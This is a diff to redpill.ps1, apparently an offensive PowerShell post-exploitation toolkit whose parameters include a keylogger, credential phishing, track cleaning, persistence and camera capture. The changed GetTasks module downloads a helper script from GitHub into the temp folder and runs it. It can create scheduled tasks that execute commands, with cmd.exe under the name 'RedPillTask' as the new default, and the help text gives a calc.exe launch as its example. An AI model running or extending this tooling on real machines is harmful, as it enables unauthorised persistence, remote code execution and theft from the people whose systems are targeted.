@@ -71,7 +71,7 @@
    [string]$ProcessName="false", [string]$CleanTracks="false", [string]$GetDnsCache="false",
    [string]$Parameters="false", [string]$PhishCreds="false", [string]$GetProcess="false",
    [string]$ApacheAddr="false", [string]$Storage="$Env:TMP", [string]$SpeakPrank="false",
-   [string]$TaskName="RedPillTask", [string]$Keylogger="false", [string]$PingSweep="false",
+   [string]$TaskName="false", [string]$Keylogger="false", [string]$PingSweep="false",
    [string]$FileMace="false", [string]$GetTasks="false", [string]$Persiste="false",
    [string]$BruteZip="false", [string]$NetTrace="false", [string]$SysInfo="false",
    [string]$GetLogs="false", [string]$Upload="false", [string]$Camera="false",
@@ -586,7 +586,7 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetTasks.ps1 -Destination $Env:TMP\GetTasks.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetTasks.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 3){## Corrupted download detected => DefaultFileSize: 3,6884765625/KB
+      If($SizeDump -lt 5){## Corrupted download detected => DefaultFileSize: 5,470703125/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -594,14 +594,30 @@ If($GetTasks -ieq "Enum" -or $GetTasks -ieq "Create" -or $GetTasks -ieq "Delete"
    }
 
    ## Run auxiliary module
-   If($GetTasks -ieq "Enum"){
-       powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Enum
-   }ElseIf($GetTasks -ieq "Create"){## exec and interval and taskname
+   If($GetTasks -ieq "Enum")
+   {
+      If($TaskName -ieq "false")
+      {
+         powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Enum
+      }
+      Else
+      {
+         powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Enum -TaskName "$TaskName"      
+      }
+
+   }
+   ElseIf($GetTasks -ieq "Create")
+   {
+       If($Exec -ieq "false"){$Exec = "cmd.exe"}
+       If($TaskName -ieq "false"){$TaskName = "RedPillTask"}
        powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Create -TaskName $TaskName -Interval $Interval -Exec $Exec
-   }ElseIf($GetTasks -ieq "Delete"){
+   }
+   ElseIf($GetTasks -ieq "Delete")
+   {
        powershell -File "$Env:TMP\GetTasks.ps1" -GetTasks Delete -TaskName $TaskName
    }
 
+   Write-Host ""
    ## Clean Old files left behind
    If(Test-Path -Path "$Env:TMP\GetTasks.ps1"){Remove-Item -Path "$Env:TMP\GetTasks.ps1" -Force}
 }
@@ -3538,44 +3554,43 @@ $HelpParameters = @"
    <#!Help.
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Enumerate\Create\Delete running tasks
+      Helper - Enumerate\Create\Delete running tasks!
 
    .DESCRIPTION
       This module enumerates remote host running tasks
       Or creates a new task Or deletes existence tasks
 
    .NOTES
-      Required Dependencies: cmd|schtasks {native}
-      Remark: Module parameters are auto-set {default}
-      Remark: Tasks have the default duration of 9 hours.
+      Required Dependencies: schtasks {native}
+      Created tasks have the default duration of 9 hours.
 
    .Parameter GetTasks
-      Accepts arguments: Enum, Create and Delete (default: Enum)
+      Accepts arguments: Enum, Create, Delete (default: Enum)
 
    .Parameter TaskName
-      Accepts the name of the task to be created (defaut: mytask)
+      The Task Name to Query, Create or to Kill (default: false)
 
    .Parameter Interval
-      Accepts the interval time (minuts) between each task execution
+      The interval time (minuts) to run the task (default: 1 minut)
 
    .Parameter Exec
-      Accepts the cmdline command to be executed through task
+      The cmdline (cmd|ps) to be executed by the task (default: false)
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -GetTasks Enum
-      Enumerate ALL ready\running tasks
+      PS C:\> .\redpill.ps1 -GetTasks Enum
+      Enumerate All running\ready schedule tasks!
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -GetTasks Create
-      Use module default settings to create one demonstration task
+      PS C:\> .\redpill.ps1 -GetTasks Enum -TaskName "CDSSync"
+      Enumerate 'CDSSync' task detailed information!
 
    .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -GetTasks Delete -TaskName mytask
-      Deletes mytask {demonstration task} by is taskname
-
-   .EXAMPLE
-      PS C:\> powershell -File redpill.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
+      PS C:\> .\redpill.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
       Creates 'mytask' taskname that executes 'calc.exe' with 10 minutes of interval and 9 hours of duration
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -GetTasks Delete -TaskName "mytask"
+      Delete\Kill 'mytask' taskname
 
    .OUTPUTS
       TaskName                                 Next Run Time          Status
